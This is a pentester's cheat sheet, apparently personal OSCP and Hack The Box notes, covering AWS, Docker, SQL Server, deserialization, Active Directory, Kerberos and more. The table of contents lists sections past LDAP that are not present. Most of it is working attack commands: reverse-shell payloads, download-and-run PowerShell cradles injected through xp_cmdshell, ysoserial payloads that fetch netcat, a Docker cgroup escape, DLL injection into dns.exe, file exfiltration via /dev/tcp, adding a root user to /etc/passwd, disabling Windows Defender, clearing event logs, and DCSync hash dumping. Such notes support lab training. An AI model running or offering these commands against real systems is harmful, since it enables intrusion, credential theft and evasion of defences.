- [`AWS`](#aws)
- [`Buffer Overflows`](#buffer-overflows)
- [`Certificates`](#certificates)
- [`Command injection examples`](#command-injection-examples)
- [`Compression`](#compression)
- [`Docker`](#docker)
- [`DB tools`](#db-tools)
- [`Date`](#date)
- [`Debugfs`](#debugfs)
- [`Deserialization`](#deserialization)
- [`Dirb`](#dirb)
- [`Dirbuster`](#dirbuster)
- [`DNS enum`](#dns-enum)
- [`DLL Injection`](#dll-injection)
- [`Excel`](#excel)
- [`Elasticsearch`](#elasticsearch)
- [`Empire`](#empire)
- [`Encode/Decode`](#encodedecode)
- [`Encryption/Decryption/Steganography`](#encryptiondecryptionsteganography)
- [`Evasion techniques (outdated)`](#evasion-techniques-outdated)
- [`Firewall rules`](#firewall-rules)
- [`Forward shell`](#forward-shell)
- [`ftp client`](#ftp-client)
- [`ftp server`](#ftp-server)
- [`ffuf`](#ffuf)
- [`gitlab`](#gitlab)
- [`Gobuster`](#gobuster)
- [`IPv6 enumeration`](#ipv6-enumeration)
- [`Jenkins`](#jenkins)
- [`Joomla`](#joomla)
- [`JWT`](#jwt)
- [`jq`](#jq)
- [`Kerberos, Active Directory & LDAP`](#kerberos-active-directory--ldap)
- [`Kibana`](#kibana)
- [`LFI`](#lfi)
- [`Malware Analysis`](#malware-analysis)
- [`Masscan`](#masscan)
- [`mdbtools`](#mdbtools)
- [`Metadata`](#metadata)
- [`Metasploit/Meterpreter`](#metasploitmeterpreter)
- [`Msfvenom`](#msfvenom)
- [`Microsoft Outlook`](#microsoft-outlook)
- [`Netcat`](#netcat)
- [`NFS`](#nfs)
- [`Nmap`](#nmap)
- [`Nikto`](#nikto)
- [`OSINT`](#osint)
- [`PHP`](#php)
- [`POP3/IMAP`](#pop3imap)
- [`Port Forwarding`](#port-forwarding)
- [`Powershell/cmd`](#powershellcmd)
- [`Privilege Escalation`](#privilege-escalation)
- [`Python`](#python)
- [`Race condition`](#race-condition)
- [`Redis`](#redis)
- [`Remote Desktop`](#remote-desktop)
- [`Reverse shells`](#reverse-shells)
- [`Reverse Engineering`](#reverse-engineering)
- [`rpcclient`](#rpcclient)
- [`Rsync`](#rsync)
- [`Searchsploit`](#searchsploit)
- [Serial analysis](#serial-analysis)
- [`Shells`](#shells)
- [`SFTP`](#sftp)
- [`SIP`](#sip)
- [`SMB`](#smb)
- [`SMTP`](#smtp)
- [`Serpico`](#serpico)
- [`SNMP`](#snmp)
- [`SQLi`](#sqli)
- [`Temp Email`](#temp-email)
- [`Vault ssh otp`](#vault-ssh-otp)
- [`VNC`](#vnc)
- [`VPN`](#vpn)
- [`Webshells`](#webshells)
- [`Wfuzz`](#wfuzz)
- [`Wordlists`](#wordlists)
- [`Web Servers`](#web-servers)
- [`Wordpress`](#wordpress)
- [`vhd files`](#vhd-files)


[OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/)

ASCII,Hex,Binary,Decimal,Base64 converter:
[CyberChef](https://gchq.github.io/CyberChef/), [Rapidtables](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)

### `AWS`

Install `awscli`
```sh
$ apt update && apt install awscli
```

configure aws cli (no real key):

```sh
$ aws configure
AWS Access Key ID [None]: test
AWS Secret Access Key [None]: test
Default region name [None]: eu-east-1
Default output format [None]: text
```

Enumerate `DynamoDB`:

```sh
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
TABLENAMES      users
$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
```

Enumerate `Buckets`:

```sh
$ aws --endpoint-url http://s3.bucket.htb/ s3 ls
2020-11-03 00:42:03 adserver
$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver
```

Download whole `Bucket`:

``sh
$ aws s3 sync s3://mybucket .
```

Upload file to bucket:

```sh
$ aws --endpoint-url http://s3.bucket.htb/ s3 cp alex.php s3://adserver/alex.php
```

`binwalk`: searching binaries for embedded files & executable code

```sh
$ binwalk <excel file>
$ binwalk -e file.xslm (extract)
```

### `Buffer Overflows` 
htb machines: safe, enterprise

commands `gdb`:

```sh
gdb -q binary
gdb> disassemble main (check for stack sub)
gdb> disassemble function
```

Guides/Intro:
https://github.com/Bretley/how2exploit_binary
https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
	
getting payload from stdin: https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection

`gef` (gdb plugin for exploit dev/rev eng): https://gef.readthedocs.io/en/master/

```sh
$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
$ gdb -q binary
gef> checksec
```
`ropper`

```sh
$ apt-get install ropper
```

`pwntools`

```sh
pip install pwntools
```

shellcodes:	https://www.exploit-db.com/shellcodes

using `strace`:

```sh
strace ./program $(python -c 'print "A"*32')
```

using `ltrace`:

```sh
$ ltrace /path/to/binary
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

vulnerable functions: https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml
	
PIC/PIE (Ellingson htb):
e.g.

```sh
$ objdump -D binary | grep puts
$ ROPgadget --binary binary > gadgets
$ grep 'pop rdi' gadgets
/usr/share/metasploit-framework/tools/exploit
$ ./pattern_create.rb -l <pattern-length>
$ (gdb) run <pattern>		(crash program)
$ (gdb) info registers 		(find eip)
$ pattern_offset.rb -q <eip-hex-value> -l <pattern-length>
```

check for system calls:

```sh
$ ldd <binary>
$ readelf <linked-library> | grep system (e.g. libc)
```

[`ret2libc`](https://www.ret2rop.com/2018/08/return-to-libc.html) attack: bypass ASLR (32-bit) & use libc to execute /bin/sh

[`ret2libc 64-bit`](https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/)

re2libc Concept:	

```sh
ldd <binary> (search for libc address)
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 	(search for system address)
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit (search for exit address)
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh  (search for /bin/sh) 
```
system -> exit ->/bin/sh

re2libc poc (fill hex with 0s until 8 hex):

```python
import struct
buf = "A" * <pattern-offset-found>
libc_addr = <libc_addr>
sh_addr = struct.pack('<I', libc+addr + <sh_addr>)
system_addr = struct.pack('<I',libc_addr + <system_addr>)
exit_addr = struct.pack('<I', libc_addr + <exit_addr>)
payload = buf + system_addr +exit_addr + sh_addr
print payload
```

### `Certificates`

openssl generate private key (xct.priv) & certificate signing request with public key (xct.csr):

```sh
$ openssl req -newkey rsa:2048 -keyout xct.priv -out xct.csr -nodes -days 365 -subj "/CN=xct" -pubkey
```

openssl pkcs12 format conversion (import to browser CLIENT certificates):

```sh
$ openssl pkcs12 -export -clcerts -in signed.cert -inkey xct.priv -out xct.p12
```

pkcs12 client cert generation steps (htb fortune, lacasadepapel):

```sh
$ openssl genrsa -out client.key 4096
$ openssl req -new -key client.key -out client.req
$ openssl x509 -req -in client.req -CA CA.crt -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
$ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
$ rm client.key client.req client.cer
```

Get certificate information:

```sh
$ echo | openssl s_client -showcerts -servername <target> -connect <target>:443 2>/dev/null | openssl x509 -inform pem -noout -text
```

Enumerating SSL certificates:
check cert in browser for domain info
sslyze --regular <target>

Openssl reverse shell(htb [ethereal](https://0xrick.github.io/hack-the-box/ethereal/)):

Cipher test:

[`sslyze`](https://github.com/nabla-c0d3/sslyze)

```sh
sslyze --starttls=postgres <target>:5432
```

`nmap ssl-enum-ciphers`:

```sh
nmap --script ssl-enum-ciphers -p <ports> <target>
```

### `Command injection examples`

- Upload netcat to victim: 

```SH
$ cd /tmp; wget http://<kali>/nc; chmod 777 ./nc; ./nc <kali> <port>
```

### `Compression`

```sh
7z x <file>.zip 
7z l -slt <file>.zip (check encryption)
fcrackzip --dictionary -p /usr/share/wordlists/rockyou.txt --verbose --use-unzip file.zip
```

### `Docker`

Enumeration

- all registered repositories: http://docker-rodeo.thm:5000/v2/_catalog
- all published tags: http://docker-rodeo.thm:5000/v2/repository/name/tags/list
- manifest data: http://docker-rodeo.thm:5000/v2/repository/name/manifests/tag

Remote access to exposed docker daemon:

```sh
$ curl http://<address>:2375/version
$ docker -H tcp://<address>:2375 ps
```

Escape via exposed docker daemon:

```sh
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Shared namespaces:

```sh
$ nsenter --target 1 --mount sh
```

List container capabilities:

```sh
$ capsh --print | grep sys_admin
```

Escape [Abusing SYS_MODULE capability](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd) monitors.htb

Misconfigured privileges:

```sh
1.  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
2.  echo 1 > /tmp/cgrp/x/notify_on_release
3.  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
4.  echo "$host_path/exploit" > /tmp/cgrp/release_agent
5.  echo '#!/bin/sh' > /exploit
6.  echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
7.  chmod a+x /exploit
8.  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Docker `docker-security` suid:

```sh
$ echo "/bin/bash" > chmod
$ chmod +x chmod 
$ export PATH=$PWD:$PATH
$ /usr/local/bin/docker-security 
root:~#
```

### `DB tools`

Microsoft `SQL server`
```sh
apt-get install dbeaver
```
`mysqldump`:
```sh
mysqldump -u <username> -p<password> --all-databases --skip-lock-tables
```
`mongodb`:
mongodb injection ($ne and $regex): htb mango writeup
mongodb connection string:
```sh
mongodb://[username:password@]host1[:port1][,...hostN[:portN]][/[database][?options]]
mongodb://<username>:<password>@<host>:<port>/<database>
```
Connect to mongodb cli:
```sh
mongo -p -u <user> <database>
```
executing commands mongodb:
```sh
db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom"});
```
`mssql` impacket:
- command: 
```sh
mssqlclient.py -windows-auth -p <port> domain/username:password@<targetName or address>
```
- steal hashes of the SQL service account:
```
responder -I tun0 -v
sql> exec xp_dirtree '\\<kali>\share\file'
sql> exec xp_fileexist '\\<kali>\share\file'
```
- enable cmdshell the execute commands from xp_cmdshell:
```sh
enable_xp_cmdshell
xp_cmdshell <cmd>
```
- Sqli example:
```sh
2;exec+xp_cmdshelL+"c:\windows\syswow64\windowspowershell\v1.0\powershell+iex(new-object+net.webclient).downloadstring('http://10.10.x.x/rev')"
```

`couchdb`:
```sh
curl http://127.0.0.1:5984
curl http://127.0.0.1:5984/_all_dbs
###Create a user:
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops'
	--data-binary '{
		"type": "user",
		"name": "oops",
		"roles": ["_admin"],
		"roles": [],
		"password": "password"
	}'

### read from a db:
curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u hack:password
```

`Mariadb`:
```sh
$ mysql -u <user> -p (connect)
$ show databases;
$ use <db>;
$ show tables;
$ SELECT * from <table>\G
```

`Oracle` database attack tool (silo htb): https://github.com/quentinhardy/odat
```sh
$ ./odat.py sidguesser -s <target> -p <port>
$ ./odat.py passwordguesser -s <target> -p <port> -d XE --accounts-file account/accounts.txt
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > file.exe
$ ./odat.py utlfile -s <target> -p 1521 -U <user> -P <pass> -d <sid> --sysdba --putFile c:/ file.exe file.exe (upload file)
$ ./odat.py externaltable -s <target> -p 1521 -U user -P pass -d XE --sysdba --exec c:/ file.exe
```

### `Date`
```sh
/etc/localtime
/etc/timezone
date -s "date"
```

### `Debugfs`
```sh
gid 6
/sbin/debugfs /dev/sda1 (current mount of root filesystem /)
debugfs: cat /root/root.txt
```

### `Deserialization`

- `ysoserial`
	- java:
		- https://github.com/frohoff/ysoserial
		- https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
	- .net:
		- https://github.com/pwntester/ysoserial.net
		- https://github.com/pwntester/ysoserial.net/releases

- `.net` deserialization

```powershell
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "ping -n 5 10.10.x.x" (bearer header)
```

- `Nodejs` deserialization (htb celestial, arkham)
	- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
	- https://hackso.me/arkham-htb-walkthrough/

```sh
$ java -jar /usr/sbin/ysoserial.jar CommonsCollections6 'powershell wget 10.10.*.*/nc.exe -O C:\\Windows\\Temp\\pwn.exe' > payload
$ java -jar /usr/sbin/ysoserial.jar CommonsCollections6 'cmd /c C:\\Windows\\Temp\\pwn.exe 10.10.*.* 1234 -e powershell.exe' > payload
```

### `Dirb`
```sh
dirb http://<target> <wordlist>
dirb http://<target> -X <extension> 	(e.g. .asp or .aspx)
dirb http://<target> -w <wordlist> -f -e extension1,extension2 -x 400
dirb http://<target> -p <proxy:port> -P <proxy_user:proxy_pass> -r
```

### `Dirbuster`
- dirb gui
- can check response size differences
- generates directory tree graphical
- search for: txt,zip,bak,rar
- in ISS search for: asm,asmx,asp,aspx
	
### `DNS enum`
```sh
$ host -t ns <domain>	(get nameserver)
$ host -t mx <domain>	(get mailserver)
$ host -l <ip/domain> <nameserver> (zone transfer)
$ dig axfr @<ip> <domain>   (zone transfers)
$ dnsrecon -d <domain> -t axfr (test NS for zone transfers)
$ dnsenum <domain/ip>
```

Search for subdomains: 
```sh
# words or code based on non existant answer
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt -u http://<up> -H "Host: FUZZ.<domain>" --hw <words>
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt -u http://<up> -H "Host: FUZZ.<domain>" --hc <code>
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://<ip> -H "Host: FUZZ.<domain>" -fs <response-size>
```

### `DLL Injection`

[DLL Injection in AD](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)
1. DNS:

```powershell
PS /> net user <user> /domain # (must be in dns admin group)

$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > privesc.dll (build the dll)
$ smbserver.py <share-name> ./ # (host the payload)
$ smbserver.py -smb2support <share $(pwd)

PS /> net view \\<smb-server-ip> # (check share connection)
PS /> dnscmd a.b.local /config /serverlevelplugindll \\<ip\<share>\privesc.dll # (inject dll in dns.exe)
PS C:\> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll (check if dll is added)
PS /> cmd /k sc \\Resolute.megabank.local stop dns		(restart dns to get shell)
PS /> cmd /k sc \\Resolute.megabank.local start dns
```

2. bypass uac (arkham writeup)

### `Excel`

- [Excel Sheet Unhide](https://github.com/denk-core/ExcelSheetUnhide)
- [unhide.py](https://gist.github.com/bontchev/8dc7f37207ba76ed71a9576ad65e0dcd)


### `Elasticsearch` 
haystack htb

```sh
#port 9200
msf> use auxilliary/elasticsearch/indices_enum
#list all indexes:
http://10.10.10.115:9200/_cat/indices?v
#query api (default 10 entries):
http://10.10.10.115:9200/<index>/_count
$ curl -H 'Content-Type: application/json' -s -X GET http://your.domain.com/enumerated_dir/_search	
$ curl -s 'http://10.10.10.115:9200/<index>/_search?size=1' | jq
$ curl -s 'http://10.10.10.115:9200/<index>/_search?size=1' | jq .field # (extract only specific field)
$ curl -H 'Content-Type: application/json' -s -X GET http://your.domain.com:9200/_cat
	
# query all data for an index
http://localhost:9200/index_found/_search?size=1000&pretty=true&q=*:*
```

### `Empire`
basic commands: https://www.embeddedhacker.com/2019/08/hacking-tutorial-rp-ps-empire/

### `Encode/Decode`
```sh
cat <file> | base64 -d  #(base64 decode)
cat <file> | xxd -r -p  #(hex to ascii)
cat <file | xxd -r > binary #(hex to binary)
cat <file | base64 -d > binary #(if encoded string is a binary)
```
Copy a file without downloading:
1. linux:
```sh
$ cat file.exe | base64
$ vi file-encoded (paste base64 from before)
$ cat file-encoded | base64 -d > file.exe

$ cat file > /dev/tcp/10.10.x.x/80
$ nc -lvp 80 > file # locally
```
upload:
```sh
$ nc -lvp 80 < file # locally
$ cat < /dev/tcp/10.10.x.x/80 > uinitrd #victim
```
2. windows:
```powershell
PC:\> certutil -encode backup.zip backup.b64
PS:\> cat backup.b64 | cmd /c C:\windows\temp\pwn.exe lhost lport
```
```sh
$ nc -lvp 4444 > backup.b64
# remove certificate markers from top and bottom
$ sed -i s/\n//g backup.b64 # remove new lines
$ base64 -d backup.b64 > backup.zip
```

### `Encryption/Decryption/Steganography`

- `luks` decrypt:

```sh
$ cryptsetup luksDump luks.img | grep "Payload offset"
$ dd if=luks.img of=hash bs=512 count=<offset+1>

.\hashcat64.exe -m 14600 -a 0 -w 3 hash wordlist.txt
```

mount:
```sh
$ cryptsetup luksOpen luks.img dump
$ mount /dev/mapper/dump /mnt
```

- `pgp` encryption:
```sh
$ gpg --list-keys
$ gpg -d file.gpg
```

[`ssh2john`](https://fossies.org/linux/john/run/ssh2john.py)

$ python ssh2john.py id_rsa > ssh.hash
$ john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt

`zip2john`
$ zip2john file.zip > zip.hash
$ john zip.hash -w=/usr/share/wordlists/rockyou.txt
$ locate *2john
$ locate *2john*

`putty` private key to rsa private `key conversion`:

```sh
$ puttygen my_private_key.ppk -O private-openssh -o id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa <user>@<address> #(login with private key)
```

Openssl newer version problems:
- bypass ssl connect error through burp proxy:
```sh
msf> set Proxies http:127.0.0.1:8080
```
`Steganography`:
https://0xrick.github.io/lists/stego/


[stegseek](https://github.com/RickdeJager/stegseek)
```sh
$ stegseek [stegofile.jpg] [wordlist.txt]
```

steghide
```sh
$ steghide –-info image.jpg
$ steghide extract -sf image.jpg
```
Strings an image for hidden content:
```sh
$ strings image.jpg
$ binwalk -e image.jpg (embedded files)
```
Gimp image editor:
```sh
$ apt-get install gimp
```
[Barcode reader](https://online-barcode-reader.inliteresearch.com/)

[Bin to Image](https://www.dcode.fr/binary-image)

Audio (WAV): [turgen](http://turgen.sourceforge.net/)

[audio to spectogram](https://academo.org/demos/spectrum-analyzer/)

[steg_brute.py](https://github.com/Va5c0/Steghide-Brute-Force-Tool)

[Stegsolve.jar](http://www.caesum.com/handbook/Stegsolve.jar)

`openssl` brute-force `salted,encrypted` files:
```sh
$ git clone https://github.com/deltaclock/go-openssl-bruteforce.git
$ ./openssl-brute --file /root/file.encrypted
```
generate a `second root user` (if `/etc/passwd writable`):

```sh
$ openssl passwd -1 -salt <user> <pass>
# Add to /etc/passwd:
username:<Salted Value of user and pass>:0:0:root:/root:/bin/bash
```

`ssh` brute force:
```sh
patator ssh_login host=<ip> port=<port> user=<user> password=FILE0 0=<path-to-wordlist> persistent=0
```

[`Filebuster`](https://github.com/henshin/filebuster)

`File to image`:
`GIF8` (in first line)
file.php.gif
`JFIF` (see magic htb)
file.php.jpg

`File to html?`:
rev_shell.php -> file.phtml

`Firefox` decrypt:
https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py

```sh	
# Thunderbird Firefox (.thunderbird file in linux) decrypt:
firefox_decrypt.py .thunderbird/found-dir/ #(attempt decryption with no master password if no password found)
# Thunderbird inbox imap mail:
/home/user/.thunderbird/*.default/ImapMail
```

[`Creds from pcap files`](https://github.com/lgandx/PCredz)

### `Evasion techniques (outdated)`

- [windows defender bypass:](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=win10-ps)

- set-mpprefererence `disable real time monitoring`
```powershell
PS C:\> Get-MpComputerStatus | Select *Enabled
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $True
```
1. windows_defender_exe
```sh
msf> use evasion/windows/windows_defender_exe
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST
msf> set LPORT
```
2. https://github.com/GreatSCT/GreatSCT
```sh
cd GreatSCT/setup
sudo ./setup.sh -c
cd ..
./GreatSCT.py
```	
3. `set`
clear logs:
```sh
meterpreter> clearev
```
4. replacing spaces with `${IFS}` in (base64 encoded payload)
5. `veil`:
https://github.com/Veil-Framework/Veil
6. `shellter`:
http://www.thesecurityblogger.com/anti-virus-bypass-with-shellter-5-1-on-kali-linux/

### `Firewall rules`
```sh
/etc/iptables/rules.v4
/etc/iptables/rules.v46
```

### [`Forward shell`](https://gist.github.com/IppSec/60942cabb1168c59b0af3002e7ff04f8)

### `ftp client`
1. lftp:
```sh
$ lftp Anonymous@<target>
```
2. ftp:
```sh
$ apt install ftp
$ ftp <target>
ftp> bin/binary (set transfer mode to binary)
ftp> get "file"
```
3. wget:
  	$ wget -m ftp://anonymous:anonymous@<target>/* --no-passive-ftp
	  $ wget -r ftp://<target>

### `ftp server`
```sh
python -m pyftpdlib -p21 -w
```

### `ffuf`
fast go fuzzer:
```sh
$ go get github.com/ffuf/ffuf
$ ffuf -u http://docker.registry.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### `gitlab` 

gitlab-rails console:

```sh
git@git:~$ gitlab-rails console
irb(main):004:0> user = User.find(1)
=> #<User id:1 @dexter>
irb(main):005:0> user.password = 'qwerty123'
```

### `Gobuster`

```sh
gobuster -e -u http://<target>/ -w <wordlist>
gobuster -e -u http://<target>/ -w <wordlist> -s '200,204,301,302,307,403,500' #(status codes)
gobuster dir -e -u http://<target>/ -w <wordlist> -s '200,204,301,302,307,403,500' #(newer version)
```

[recursive-gobuster](https://github.com/epi052/recursive-gobuster)
```sh
recursive-gobuster.pyz -d http://<target>:<port>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 20 | tee gobuster/directories
```

`IP to Decimal` (when dots are filtered)
	https://www.browserling.com/tools/ip-to-dec

### `IPv6 enumeration`
[enyx](https://github.com/trickster0/Enyx)
```sh
$ python enyx.py 2c public <target-ipv4>
```

### `Jenkins`
Jenkins groovy reverse shell (http://jenkins-ip/script):
- https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
- https://www.pwndefend.com/2020/02/02/try-hack-me-part-3-alfred/


### `Joomla`
http://\<address>/administrator

### `JWT`
- https://jwt.io/
- [jwt-tool](https://github.com/ticarpi/jwt_tool)

### `jq` 
cli json processor
```sh
apt-get install jq
```

### `Kerberos, Active Directory & LDAP`
- [Tarlogic article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

- Active directory (priv esc):
	- https://adsecurity.org/?p=2362 
	- search the domain SYSVOL DFS share for XML files: groups.xml (user name & password), scheduledtasks.xml, & Services.xml
- Kerberos flow: https://adsecurity.org/?p=227
	- Domain Controller = KDC (AS + TGS)
	- Authenticate to AS with password
		- get a TGT
	- Request log in to a service
		- service redirects to KDC
		- Show TGT to KDC (already authenticated)
		- KDC gives TGS for service
	- Redirect to service
		- show service ticket to service server
		- service server verifies/trusts service ticket
		- service server allows access

- Kerberos Package:
```sh
$ apt-get install heimdal-clients
```
- Kerberos client configuration:
```sh
/etc/krb5.conf
[libdeafults]
	default_realm = ALEX.LOCAL	Realm = domain in uppercase
[realms]
	ALEX.LOCAL {
		kdc = whatever.alex.local
		admin_server = whatever.alex.local
		default_domain = whatever.alex.local
	}
[domain_realm]
	.alex.local = ALEX.LOCAL
	.alex.local = ALEX.LOCAL
/etc/resolv.conf
	domain alex.local
	server alex.local
	nameserver <kdc-ip>
```
- Syncronize time with KDC:
```sh
$ rdate -nv <target>
```
- Basic commands:
```sh
kinit user@REALM #(TGT check out)
klist #(list current tickets)
```
- Any tool that support krb auth can be used after kinit
```sh
$ export KRB5CCNAME=/tmp/krb5cc_0
$ ./psexec.py -k -no-pass ALEX.LOCAL/<user>@whatever.alex.local
$ ./wmiexec.py -k -no-pass ALEX.LOCAL/<user>@whatever.alex.local
```

[`pykek`](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) MS14-068

`Crackmapexec`:
```sh
$ crackmapexec (smb) <target> (domain enumeration)
$ crackmapexec smb <target> --shares -u <user> -p <pwd> (shares enumeration)
```
`Nmap Kerberos`:
- Discover valid usernames by brute force querying likely usernames against a Kerberos service:
```sh
$ db_nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='<domain>' <target>
```
- Determine the operating system, computer name, domain, workgroup over SMB
```sh
$ db_nmap --script smb-os-discovery -p <139 or 445> <target>
```

`Impacket`:
```sh
apt-get install impacket-scripts
./getArch.py -target <target> (32/64bit)
psexec.py user:'password'@<address>
smbexec.py user:'password'@<address>
wmiexec.py user:'password'@<address>
goldenPac.py htb.local/james@mantis.htb.local
```
- `SAM impacket`:
	- https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/
	```sh
	secretsdump.py -system file.bin -ntds file.dit LOCAL
	secretsdump.py -sam SAM -security SECURITY LOCAL
	```
- `SAM esenutil`:
	- https://github.com/csababarta/ntdsxtract
	- https://github.com/libyal/libesedb

- Kerberos Pre Auth (AS-REP Roasting):
	- https://ldapwiki.com/wiki/Kerberos Pre-Authentication
	- https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/
	- harvest the non-preauth AS_REP responses: https://forum.hackthebox.eu/discussion/2749/getnpusers-py-explained-video
	
		```sh		
		$ ./GetNPUsers.py <domain>/ -dc-ip <address> -outputfile hash-output #(if no user enumed)
		$ ./GetNPUsers.py <domain>/<user>  -outputfile hash-output
		$ ./GetNPUsers.py <domain>/ -usersfile /path/to/users.txt  -outputfile hash-output
		
		$ hashcat -m 18200 ./hash-output -a 0 /usr/share/wordlists/rockyou.txt --force
		$ john hash-output --wordlist=/usr/share/wordlists/rockyou.txt
		```

- Priv Esc: [`Windows Kernel Exploits`](https://github.com/SecWiki/windows-kernel-exploits)

- [`SPN`](https://docs.microsoft.com/en-us/windows/desktop/ad/service-principal-names)
	- You can request a TGS for a SPN (tied to a user)
	- TGS is encrypted with the SPN owner's NTLM hash (offline crack)
	- impacket-GetUserSPNs : (get spn)
	```sh
	./GetUserSPNs.py -request -dc-ip <dc-ip> <domain>/<user>:<password>
	$ hashcat -i | grep -i tgs (13100)
	$ hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force (crack password)
	msf> use exploit/windows/smb/psexec (login with an administrator shell)
	```
- [`Kerbrute`](https://github.com/ropnop/kerbrute)
```sh
$ ./kerbrute_linux_amd64 userenum -d <domain> --dc <kdc> usernames.txt
$ ./kerbrute_linux_amd64 bruteuser -d <domain> --dc <kdc> /usr/share/wordlists/rockyou.txt <user>
```
- `Over Pass the Hash`:
```sh
./getTGT -hashes LMHASH:NTHASH <realm>/<user>
```
- Persistence:
	- To Do

`WriteDacl Permission, DCSync`
With the WriteDacl permission, we can grant the newly created user with DCSync rights to dump the NTLM hashes (Exchange Trusted Subsystem Group required or Replicating Directory Changes All,Replicating Directory Changes groups)
```powershell
C:\ Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members <user>
C:\ iex (new-object net.webclient).downloadstring('http://<target>/PowerView.ps1')
C:\ Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity <user> -Rights DCSync
```
```sh
$ secretsdump.py -just-dc 'htb/<user>:<pass>@<address>' (dump ntlm hashes)
$ secretsdump.py -dc-ip 10.10.104.142 spookysec.local/backup:backup2517860@10.10.104.142
$ smbexec.py -hashes '<ntlm hash>' 'htb/administrator@<target>'
or
msf> use exploit/windows/smb/psexec
msf> set SMBPASS <hash>
```

- `Covenant`:
	- https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462

`Bloodhound on kali linux`
```sh
$ apt-get install bloodhound
$ neo4j console
```
`Bloodhound.py`: Python based ingestor for Bloodhound
```sh
$ git clone https://github.com/fox-it/BloodHound.py.git 
#or
pip install bloodhound
$ bloodhound-python -d <domain> -u<user> -p <pass> -gc <domain> -c all -ns <ip>
```
Import json generated to bloodhound

`Bloodhound on windows shells` (seems to have better results):
1. upload:
kali: 
```sh
$ cd /path/to/Bloodhound/Ingestors; python -m SimpleHTTPServer 80;
```
windows shell:
```powershell
PS C:\ iex(new-object net.webclient).downloadstring('http://<host>/SharpHound.ps1')
PC C:\ (New-Object System.Net.WebClient).DownloadFile('http://<host>/file.exe', "$PSScriptRoot\file.exe")
PS C:\ Invoke-BloodHound -CollectionMethod All -LDAPPort 389 -LDAPUser <user> -LDAPPass <pass> (generates a zip file)
```
`Abusing ACLs`:
- https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

`aclpwn`
```sh
$ aclpwn -f <username> -ft user -d HTB.LOCAL -du <neo4j-username>
```
- https://www.puckiestyle.nl/aclpwn-py/
- https://github.com/fox-it/aclpwn.py
- https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound

`Knockd`: a port knock listener:
configuration file at /etc/knockd.conf
```sh
1. knock <server> <port1> <port2> <port3>
2. for x in 9000 8000 7000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done
```

`ldap`
- Ldap search script nmap:
- [Intro talk](https://www.youtube.com/watch?v=2Xfd962QfPs) about ldap/kerberos pentesting:	
- Ports:
	- 389 - LDAP
	- 636 - LDAPS (SSL)
	- 3269 - LDAP Global Catalog
- Syntax:
	- DC - Domain Component (e.g. a.b.com: DC=a, DC=b, DC=com)
	- OU - Organizational Unit (folders)
	- CN - Common Name (User/group/computer name) 
	- DN - Every object has a Distingushed Name
